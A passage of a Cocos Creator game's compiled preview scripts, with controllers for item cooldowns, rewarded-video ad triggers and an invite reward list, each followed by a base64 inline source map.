CBleHQud3hDcmVhdGVJbWFnZVRvU3ByaXRlKHRoaXMuaWNvblNwcml0ZSwgZGF0YVsnaGVhZFVybCddKTtcclxuICAgICAgICB0aGlzLnRha2VuTm9kZS5hY3RpdmUgPSBkYXRhWydyZWNlaXZlJ107XHJcbiAgICAgICAgdGhpcy53aWxsVGFrZU5vZGUuYWN0aXZlID0gIXRoaXMudGFrZW5Ob2RlLmFjdGl2ZTtcclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrVGFrZVJld2FyZChldmVudCwgZGF0YSl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJBjbGlja+OAkUludml0ZUl0ZW0gVGFrZVJld2FyZFwiKVxyXG5cclxuICAgICAgICBpZiAodGhpcy5kYXRhKXtcclxuICAgICAgICAgICAgdGhpcy53aWxsVGFrZU5vZGUuZ2V0Q29tcG9uZW50KGNjLkJ1dHRvbikuaW50ZXJhY3RhYmxlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIE5ldHdvcmsudGFrZVNoYXJlUmV3YXJkKFwic2hhcmUxXCIsIHRoaXMuZGF0YVtcInBsYXllcklkXCJdKS50aGVuKHJlcz0+e1xyXG4gICAgICAgICAgICAgICAgV29ybGQuU3RvcmFnZS5kaWFtb25kQ291bnQgKz0gcmV3YXJkTnVtO1xyXG4gICAgICAgICAgICAgICAgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKCdTaG93VGlwc0NvbW1hbmQnLCBg6ZK755+zICske3Jld2FyZE51bX1gKTtcclxuICAgICAgICAgICAgICAgIHRoaXMudGFrZW5Ob2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLndpbGxUYWtlTm9kZS5hY3RpdmUgPSAhdGhpcy50YWtlbk5vZGUuYWN0aXZlO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/PropsItemController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'd06a8YvgQJJG4ULGjMJqc1Z', 'PropsItemController');
// script/app/home/PropsItemController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var AbstractTableItem_1 = require("../../../framework/tableview/AbstractTableItem");
var PropsController_1 = require("./PropsController");
var World_1 = require("../info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var PropsItemController = /** @class */ (function (_super) {
    __extends(PropsItemController, _super);
    function PropsItemController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.propsController = null;
        _this.bgFrameSprite = null;
        _this.iconSprite = null;
        _this.nameLabel = null;
        _this.useNode = null;
        _this.usingNode = null;
        _this.foreverNode = null;
        _this.cdLabel = null;
        _this.iconSpriteFrames = [];
        _this._data = null;
        _this._index = null;
        return _this;
    }
    PropsItemController.prototype.onLoad = function () {
        var _this = this;
        this.schedule(function () {
            if (_this.node.active && _this.usingNode.active && _this._data) {
                var id = _this._data['id'];
                if (World_1.World.My.propInfo.beUsing(id)) {
                    _this.updateCD();
                }
                else {
                    _this.foreverNode.active = false;
                    _this.useNode.active = true;
                    _this.usingNode.active = false;
                }
            }
        }, 0.99);
        cc.game.on("video_2", function () {
            _this.onClickUseDo();
        }, this);
    };
    PropsItemController.prototype.updateCD = function () {
        var cd = Math.floor((World_1.World.My.propInfo.expireTime(this._data['id']) - new Date().getTime()) / 1000);
        var min = Math.floor(cd / 60);
        var sec = cd % 60;
        this.cdLabel.string = "\u5269\u4F59\u8BA1\u65F6 " + (("000" + min).substr(-2) + ":" + ("000" + sec).substr(-2));
    };
    PropsItemController.prototype.upadteItem = function (data, index) {
        this._data = data;
        this._index = index;
        // console.log(data, index);
        var id = data['id'];
        this.iconSprite.spriteFrame = this.iconSpriteFrames[id - 1];
        this.nameLabel.string = data['prop_name'];
        if (data['unlock'] == 0) {
            this.foreverNode.active = true;
            this.useNode.active = false;
            this.usingNode.active = false;
        }
        else if (!World_1.World.My.propInfo.beUsing(id)) {
            this.foreverNode.active = false;
            this.useNode.active = true;
            this.usingNode.active = false;
        }
        else {
            this.foreverNode.active = false;
            this.useNode.active = false;
            this.usingNode.active = true;
            this.updateCD();
        }
    };
    PropsItemController.prototype.onClickDetail = function () {
        console.log("【click】PropsItemController Detail");
        this.propsController.detailLabel.string = this._data['description'];
        this.propsController.detailNode.active = true;
    };
    PropsItemController.prototype.onClickUse = function () {
        console.log("【video】2 道具使用 【click】PropsItemController Use");
        World_1.World.Storage._videoSign = 2;
        World_1.World.Storage.videoAd_show();
    };
    PropsItemController.prototype.onClickUseDo = function () {
        World_1.World.My.propInfo.use(this._data['id']);
        this.upadteItem(this._data, this._index);
    };
    __decorate([
        property(PropsController_1.default)
    ], PropsItemController.prototype, "propsController", void 0);
    __decorate([
        property(cc.Sprite)
    ], PropsItemController.prototype, "bgFrameSprite", void 0);
    __decorate([
        property(cc.Sprite)
    ], PropsItemController.prototype, "iconSprite", void 0);
    __decorate([
        property(cc.Label)
    ], PropsItemController.prototype, "nameLabel", void 0);
    __decorate([
        property(cc.Node)
    ], PropsItemController.prototype, "useNode", void 0);
    __decorate([
        property(cc.Node)
    ], PropsItemController.prototype, "usingNode", void 0);
    __decorate([
        property(cc.Node)
    ], PropsItemController.prototype, "foreverNode", void 0);
    __decorate([
        property(cc.Label)
    ], PropsItemController.prototype, "cdLabel", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], PropsItemController.prototype, "iconSpriteFrames", void 0);
    PropsItemController = __decorate([
        ccclass
    ], PropsItemController);
    return PropsItemController;
}(AbstractTableItem_1.default));
exports.default = PropsItemController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvUHJvcHNJdGVtQ29udHJvbGxlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0Esb0ZBQStFO0FBQy9FLHFEQUFnRDtBQUNoRCx1Q0FBb0M7QUFFOUIsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBaUQsdUNBQWlCO0lBQWxFO1FBQUEscUVBbUdDO1FBaEdHLHFCQUFlLEdBQW1CLElBQUksQ0FBQztRQUd2QyxtQkFBYSxHQUFhLElBQUksQ0FBQztRQUcvQixnQkFBVSxHQUFhLElBQUksQ0FBQztRQUc1QixlQUFTLEdBQVksSUFBSSxDQUFDO1FBRzFCLGFBQU8sR0FBVyxJQUFJLENBQUM7UUFHdkIsZUFBUyxHQUFXLElBQUksQ0FBQztRQUd6QixpQkFBVyxHQUFXLElBQUksQ0FBQztRQUczQixhQUFPLEdBQVksSUFBSSxDQUFDO1FBR3hCLHNCQUFnQixHQUFvQixFQUFFLENBQUM7UUFFL0IsV0FBSyxHQUFHLElBQUksQ0FBQztRQUNiLFlBQU0sR0FBRyxJQUFJLENBQUM7O0lBcUUxQixDQUFDO0lBbkVHLG9DQUFNLEdBQU47UUFBQSxpQkFpQkM7UUFoQkcsSUFBSSxDQUFDLFFBQVEsQ0FBQztZQUNWLElBQUksS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLElBQUksS0FBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLElBQUksS0FBSSxDQUFDLEtBQUssRUFBQztnQkFDeEQsSUFBSSxFQUFFLEdBQUcsS0FBSSxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQztnQkFDMUIsSUFBSSxhQUFLLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsRUFBRSxDQUFDLEVBQUM7b0JBQzlCLEtBQUksQ0FBQyxRQUFRLEVBQUUsQ0FBQztpQkFDbkI7cUJBQUs7b0JBQ0YsS0FBSSxDQUFDLFdBQVcsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO29CQUNoQyxLQUFJLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7b0JBQzNCLEtBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztpQkFDakM7YUFDSjtRQUNMLENBQUMsRUFBRSxJQUFJLENBQUMsQ0FBQztRQUVULEVBQUUsQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLFNBQVMsRUFBQztZQUNqQixLQUFJLENBQUMsWUFBWSxFQUFFLENBQUE7UUFDdkIsQ0FBQyxFQUFDLElBQUksQ0FBQyxDQUFDO0lBQ1osQ0FBQztJQUVPLHNDQUFRLEdBQWhCO1FBQ0ksSUFBSSxFQUFFLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLGFBQUssQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLFVBQVUsQ0FBQyxJQUFJLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDLEdBQUcsSUFBSSxJQUFJLEVBQUUsQ0FBQyxPQUFPLEVBQUUsQ0FBQyxHQUFDLElBQUksQ0FBQyxDQUFDO1FBQ2xHLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxLQUFLLENBQUMsRUFBRSxHQUFDLEVBQUUsQ0FBQyxDQUFDO1FBQzVCLElBQUksR0FBRyxHQUFHLEVBQUUsR0FBQyxFQUFFLENBQUM7UUFDaEIsSUFBSSxDQUFDLE9BQU8sQ0FBQyxNQUFNLEdBQUcsK0JBQVEsQ0FBQyxLQUFLLEdBQUMsR0FBRyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUMsR0FBRyxHQUFDLENBQUMsS0FBSyxHQUFDLEdBQUcsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFFLENBQUM7SUFDdEYsQ0FBQztJQUVELHdDQUFVLEdBQVYsVUFBVyxJQUFTLEVBQUUsS0FBYTtRQUMvQixJQUFJLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQztRQUNsQixJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNwQiw0QkFBNEI7UUFDNUIsSUFBSSxFQUFFLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ3BCLElBQUksQ0FBQyxVQUFVLENBQUMsV0FBVyxHQUFHLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxFQUFFLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDMUQsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLFdBQVcsQ0FBQyxDQUFDO1FBQzFDLElBQUksSUFBSSxDQUFDLFFBQVEsQ0FBQyxJQUFJLENBQUMsRUFBQztZQUNwQixJQUFJLENBQUMsV0FBVyxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7WUFDL0IsSUFBSSxDQUFDLE9BQU8sQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1lBQzVCLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztTQUNqQzthQUFLLElBQUksQ0FBQyxhQUFLLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsRUFBRSxDQUFDLEVBQUU7WUFDdEMsSUFBSSxDQUFDLFdBQVcsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1lBQ2hDLElBQUksQ0FBQyxPQUFPLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztZQUMzQixJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7U0FDakM7YUFBSztZQUNGLElBQUksQ0FBQyxXQUFXLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztZQUNoQyxJQUFJLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7WUFDNUIsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1lBQzdCLElBQUksQ0FBQyxRQUFRLEVBQUUsQ0FBQztTQUNuQjtJQUNMLENBQUM7SUFFRCwyQ0FBYSxHQUFiO1FBQ0ksT0FBTyxDQUFDLEdBQUcsQ0FBQyxtQ0FBbUMsQ0FBQyxDQUFBO1FBRWhELElBQUksQ0FBQyxlQUFlLENBQUMsV0FBVyxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLGFBQWEsQ0FBQyxDQUFDO1FBQ3BFLElBQUksQ0FBQyxlQUFlLENBQUMsVUFBVSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7SUFDbEQsQ0FBQztJQUVELHdDQUFVLEdBQVY7UUFDSSxPQUFPLENBQUMsR0FBRyxDQUFDLDhDQUE4QyxDQUFDLENBQUE7UUFFM0QsYUFBSyxDQUFDLE9BQU8sQ0FBQyxVQUFVLEdBQUMsQ0FBQyxDQUFBO1FBQzFCLGFBQUssQ0FBQyxPQUFPLENBQUMsWUFBWSxFQUFFLENBQUE7SUFDaEMsQ0FBQztJQUVELDBDQUFZLEdBQVo7UUFDSSxhQUFLLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDO1FBQ3hDLElBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLEtBQUssRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDN0MsQ0FBQztJQS9GRDtRQURDLFFBQVEsQ0FBQyx5QkFBZSxDQUFDO2dFQUNhO0lBR3ZDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7OERBQ1c7SUFHL0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQzsyREFDUTtJQUc1QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDOzBEQUNPO0lBRzFCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7d0RBQ0s7SUFHdkI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzswREFDTztJQUd6QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOzREQUNTO0lBRzNCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7d0RBQ0s7SUFHeEI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFdBQVcsQ0FBQztpRUFDYztJQTNCdEIsbUJBQW1CO1FBRHZDLE9BQU87T0FDYSxtQkFBbUIsQ0FtR3ZDO0lBQUQsMEJBQUM7Q0FuR0QsQUFtR0MsQ0FuR2dELDJCQUFpQixHQW1HakU7a0JBbkdvQixtQkFBbUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEFic3RyYWN0VGFibGVJdGVtIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvdGFibGV2aWV3L0Fic3RyYWN0VGFibGVJdGVtXCI7XHJcbmltcG9ydCBQcm9wc0NvbnRyb2xsZXIgZnJvbSBcIi4vUHJvcHNDb250cm9sbGVyXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi9pbmZvL1dvcmxkXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFByb3BzSXRlbUNvbnRyb2xsZXIgZXh0ZW5kcyBBYnN0cmFjdFRhYmxlSXRlbSB7XHJcblxyXG4gICAgQHByb3BlcnR5KFByb3BzQ29udHJvbGxlcilcclxuICAgIHByb3BzQ29udHJvbGxlcjpQcm9wc0NvbnRyb2xsZXIgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGUpXHJcbiAgICBiZ0ZyYW1lU3ByaXRlOmNjLlNwcml0ZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlNwcml0ZSlcclxuICAgIGljb25TcHJpdGU6Y2MuU3ByaXRlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBuYW1lTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdXNlTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHVzaW5nTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGZvcmV2ZXJOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGNkTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGVGcmFtZSlcclxuICAgIGljb25TcHJpdGVGcmFtZXM6W2NjLlNwcml0ZUZyYW1lXSA9IFtdO1xyXG5cclxuICAgIHByaXZhdGUgX2RhdGEgPSBudWxsO1xyXG4gICAgcHJpdmF0ZSBfaW5kZXggPSBudWxsO1xyXG5cclxuICAgIG9uTG9hZCgpe1xyXG4gICAgICAgIHRoaXMuc2NoZWR1bGUoKCk9PntcclxuICAgICAgICAgICAgaWYgKHRoaXMubm9kZS5hY3RpdmUgJiYgdGhpcy51c2luZ05vZGUuYWN0aXZlICYmIHRoaXMuX2RhdGEpe1xyXG4gICAgICAgICAgICAgICAgbGV0IGlkID0gdGhpcy5fZGF0YVsnaWQnXTtcclxuICAgICAgICAgICAgICAgIGlmIChXb3JsZC5NeS5wcm9wSW5mby5iZVVzaW5nKGlkKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy51cGRhdGVDRCgpO1xyXG4gICAgICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuZm9yZXZlck5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy51c2VOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy51c2luZ05vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9LCAwLjk5KTtcclxuXHJcbiAgICAgICAgY2MuZ2FtZS5vbihcInZpZGVvXzJcIiwoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLm9uQ2xpY2tVc2VEbygpXHJcbiAgICAgICAgfSx0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIHVwZGF0ZUNEKCl7XHJcbiAgICAgICAgbGV0IGNkID0gTWF0aC5mbG9vcigoV29ybGQuTXkucHJvcEluZm8uZXhwaXJlVGltZSh0aGlzLl9kYXRhWydpZCddKSAtIG5ldyBEYXRlKCkuZ2V0VGltZSgpKS8xMDAwKTtcclxuICAgICAgICBsZXQgbWluID0gTWF0aC5mbG9vcihjZC82MCk7XHJcbiAgICAgICAgbGV0IHNlYyA9IGNkJTYwO1xyXG4gICAgICAgIHRoaXMuY2RMYWJlbC5zdHJpbmcgPSBg5Ymp5L2Z6K6h5pe2ICR7KFwiMDAwXCIrbWluKS5zdWJzdHIoLTIpK1wiOlwiKyhcIjAwMFwiK3NlYykuc3Vic3RyKC0yKX1gO1xyXG4gICAgfVxyXG5cclxuICAgIHVwYWR0ZUl0ZW0oZGF0YTogYW55LCBpbmRleDogbnVtYmVyKSB7XHJcbiAgICAgICAgdGhpcy5fZGF0YSA9IGRhdGE7XHJcbiAgICAgICAgdGhpcy5faW5kZXggPSBpbmRleDtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhkYXRhLCBpbmRleCk7XHJcbiAgICAgICAgbGV0IGlkID0gZGF0YVsnaWQnXTtcclxuICAgICAgICB0aGlzLmljb25TcHJpdGUuc3ByaXRlRnJhbWUgPSB0aGlzLmljb25TcHJpdGVGcmFtZXNbaWQtMV07XHJcbiAgICAgICAgdGhpcy5uYW1lTGFiZWwuc3RyaW5nID0gZGF0YVsncHJvcF9uYW1lJ107XHJcbiAgICAgICAgaWYgKGRhdGFbJ3VubG9jayddID09IDApe1xyXG4gICAgICAgICAgICB0aGlzLmZvcmV2ZXJOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIHRoaXMudXNlTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgdGhpcy51c2luZ05vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfWVsc2UgaWYgKCFXb3JsZC5NeS5wcm9wSW5mby5iZVVzaW5nKGlkKSkge1xyXG4gICAgICAgICAgICB0aGlzLmZvcmV2ZXJOb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB0aGlzLnVzZU5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgdGhpcy51c2luZ05vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICB0aGlzLmZvcmV2ZXJOb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB0aGlzLnVzZU5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIHRoaXMudXNpbmdOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIHRoaXMudXBkYXRlQ0QoKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja0RldGFpbCgpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFQcm9wc0l0ZW1Db250cm9sbGVyIERldGFpbFwiKVxyXG5cclxuICAgICAgICB0aGlzLnByb3BzQ29udHJvbGxlci5kZXRhaWxMYWJlbC5zdHJpbmcgPSB0aGlzLl9kYXRhWydkZXNjcmlwdGlvbiddO1xyXG4gICAgICAgIHRoaXMucHJvcHNDb250cm9sbGVyLmRldGFpbE5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrVXNlKCl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJB2aWRlb+OAkTIg6YGT5YW35L2/55SoIOOAkGNsaWNr44CRUHJvcHNJdGVtQ29udHJvbGxlciBVc2VcIilcclxuXHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5fdmlkZW9TaWduPTJcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLnZpZGVvQWRfc2hvdygpIFxyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tVc2VEbygpe1xyXG4gICAgICAgIFdvcmxkLk15LnByb3BJbmZvLnVzZSh0aGlzLl9kYXRhWydpZCddKTtcclxuICAgICAgICB0aGlzLnVwYWR0ZUl0ZW0odGhpcy5fZGF0YSwgdGhpcy5faW5kZXgpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/InvitesController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0e6831yPJtIjo1qDNuGnPS0', 'InvitesController');
// script/app/home/InvitesController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var TableViewMediator_1 = require("../../../framework/tableview/TableViewMediator");
var NetworkConfig_1 = require("../config/NetworkConfig");
var Network_1 = require("../network/Network");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var InvitesController = /** @class */ (function (_super) {
    __extends(InvitesController, _super);
    function InvitesController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.tableviewMediator = null;
        return _this;
    }
    // LIFE-CYCLE CALLBACKS:
    InvitesController.prototype.onLoad = function () {
        var _this = this;
        if (NetworkConfig_1.NetworkConfig.connectServer) {
            Network_1.default.getShareList("share1").then(function (list) {
                console.log(list, "share1===>");
                _this.tableviewMediator.datas = list;
            });
        }
    };
    __decorate([
        property(TableViewMediator_1.default)
    ], InvitesController.prototype, "tableviewMediator", void 0);
    InvitesController = __decorate([
        ccclass
    ], InvitesController);
    return InvitesController;
}(cc.Component));
exports.default = InvitesController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvSW52aXRlc0NvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLG9GQUErRTtBQUMvRSx5REFBc0Q7QUFDdEQsOENBQXlDO0FBRW5DLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQStDLHFDQUFZO0lBQTNEO1FBQUEscUVBZ0JDO1FBYkcsdUJBQWlCLEdBQXFCLElBQUksQ0FBQzs7SUFhL0MsQ0FBQztJQVZHLHdCQUF3QjtJQUN4QixrQ0FBTSxHQUFOO1FBQUEsaUJBT0M7UUFORyxJQUFJLDZCQUFhLENBQUMsYUFBYSxFQUFDO1lBQzVCLGlCQUFPLENBQUMsWUFBWSxDQUFDLFFBQVEsQ0FBQyxDQUFDLElBQUksQ0FBQyxVQUFBLElBQUk7Z0JBQ3BDLE9BQU8sQ0FBQyxHQUFHLENBQUMsSUFBSSxFQUFFLFlBQVksQ0FBQyxDQUFDO2dCQUNoQyxLQUFJLENBQUMsaUJBQWlCLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQztZQUN4QyxDQUFDLENBQUMsQ0FBQztTQUNOO0lBQ0wsQ0FBQztJQVhEO1FBREMsUUFBUSxDQUFDLDJCQUFpQixDQUFDO2dFQUNlO0lBSDFCLGlCQUFpQjtRQURyQyxPQUFPO09BQ2EsaUJBQWlCLENBZ0JyQztJQUFELHdCQUFDO0NBaEJELEFBZ0JDLENBaEI4QyxFQUFFLENBQUMsU0FBUyxHQWdCMUQ7a0JBaEJvQixpQkFBaUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IFRhYmxlVmlld01lZGlhdG9yIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvdGFibGV2aWV3L1RhYmxlVmlld01lZGlhdG9yXCI7XHJcbmltcG9ydCB7TmV0d29ya0NvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9OZXR3b3JrQ29uZmlnXCI7XHJcbmltcG9ydCBOZXR3b3JrIGZyb20gXCIuLi9uZXR3b3JrL05ldHdvcmtcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgSW52aXRlc0NvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShUYWJsZVZpZXdNZWRpYXRvcilcclxuICAgIHRhYmxldmlld01lZGlhdG9yOlRhYmxlVmlld01lZGlhdG9yID0gbnVsbDtcclxuXHJcblxyXG4gICAgLy8gTElGRS1DWUNMRSBDQUxMQkFDS1M6XHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIGlmIChOZXR3b3JrQ29uZmlnLmNvbm5lY3RTZXJ2ZXIpe1xyXG4gICAgICAgICAgICBOZXR3b3JrLmdldFNoYXJlTGlzdChcInNoYXJlMVwiKS50aGVuKGxpc3Q9PntcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGxpc3QsIFwic2hhcmUxPT09PlwiKTtcclxuICAgICAgICAgICAgICAgIHRoaXMudGFibGV2aWV3TWVkaWF0b3IuZGF0YXMgPSBsaXN0